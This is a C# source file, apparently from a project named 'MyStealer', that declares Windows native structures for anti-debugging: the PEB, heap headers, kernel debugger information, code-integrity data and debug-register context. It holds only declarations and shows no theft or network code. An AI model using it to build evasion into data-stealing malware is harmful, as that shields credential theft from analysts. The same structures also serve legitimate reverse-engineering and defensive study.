using System.Runtime.InteropServices;
using System;

namespace MyStealer.AntiDebug
{
    internal partial class NativeCalls
    {
        public const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint P1Home;
            public uint P2Home;
            public uint P3Home;
            public uint P4Home;
            public uint P5Home;
            public uint P6Home;
            public long ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr4;
            public uint Dr5;
            public uint Dr6;
            public uint Dr7;
        }

        public struct PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY
        {
            public uint MicrosoftSignedOnly;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct SYSTEM_CODEINTEGRITY_INFORMATION
        {
            [FieldOffset(0)]
            public ulong Length;

            [FieldOffset(4)]
            public uint CodeIntegrityOptions;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            internal IntPtr Reserved1;
            internal IntPtr PebBaseAddress;
            internal IntPtr Reserved2_0;
            internal IntPtr Reserved2_1;
            internal IntPtr UniqueProcessId;
            internal IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_KERNEL_DEBUGGER_INFORMATION
        {
            [MarshalAs(UnmanagedType.U1)]
            public bool KernelDebuggerEnabled;

            [MarshalAs(UnmanagedType.U1)]
            public bool KernelDebuggerNotPresent;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_TYPE_INFORMATION
        {
            public UNICODE_STRING TypeName;
            public uint TotalNumberOfHandles;
            public uint TotalNumberOfObjects;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ALL_INFORMATION
        {
            public uint NumberOfObjects;
            public OBJECT_TYPE_INFORMATION[] ObjectTypeInformation;
        }

        /// <summary>
        /// https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct _PEB
        {
            public byte InheritedAddressSpace;
            public byte ReadImageFileExecOptions;
            public byte BeingDebugged;
            public byte SpareBool;
            public IntPtr Mutant;
            public IntPtr ImageBaseAddress;
            public IntPtr Ldr;
            public IntPtr ProcessParameters;
            public IntPtr SubSystemData;
            public IntPtr ProcessHeap;
            public IntPtr FastPebLock;
            public IntPtr AtlThunkSListPtr; // FastPebLockRoutine
            public IntPtr IFEOKey; // FastPebUnlockRoutine
            public uint CrossProcessFlags; // EnvironmentUpdateCount
            public IntPtr KernelCallbackTable;
            public uint SystemReserved;
            public uint AtlThunkSListPtr32;
            public IntPtr ApiSetMap;
            public uint TlsExpansionCounter;
            public IntPtr TlsBitmap;
            public fixed uint TlsBitmapBits[2];
            public IntPtr ReadOnlySharedMemoryBase;
            public IntPtr SharedData;
            public IntPtr ReadOnlyStaticServerData;
            public IntPtr AnsiCodePageData;
            public IntPtr OemCodePageData;
            public IntPtr UnicodeCaseTableData;
            public uint NumberOfProcessors;
            public uint NtGlobalFlag;

            public static _PEB ParsePeb() => Marshal.PtrToStructure<_PEB>(GetPeb());
        }

        /// <summary>
        /// Below Vista: https://systemroot.gitee.io/pages/apiexplorer/d5/d5/struct__HEAP.html#o2
        /// Vista or Later: https://www.nirsoft.net/kernel_struct/vista/HEAP.html
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        public struct _HEAP
        {
            public _HEAP_ENTRY Entry;
            public uint SegmentSignature;
            public uint SegmentFlags;
            public _LIST_ENTRY SegmentListEntry;
            public IntPtr Heap;
            public IntPtr BaseAddress;
            public uint NumberOfPages;
            public IntPtr FirstEntry;
            public IntPtr LastValidEntry;
            public uint NumberOfUnCommittedPages;
            public uint NumberOfUnCommittedRanges;
            public ushort SegmentAllocatorBackTraceIndex;
            public ushort Reserved;
            public _LIST_ENTRY UCRSegmentList;
            public uint Flags;
            public uint ForceFlags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct _HEAP_ENTRY
        {
            public ushort Size;
            public ushort Flags;
            public ushort SmallTagIndex;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct _LIST_ENTRY
        {
            public IntPtr Flink; // Forward Link
            public IntPtr Blink; // Backward Link
        }
    }
}
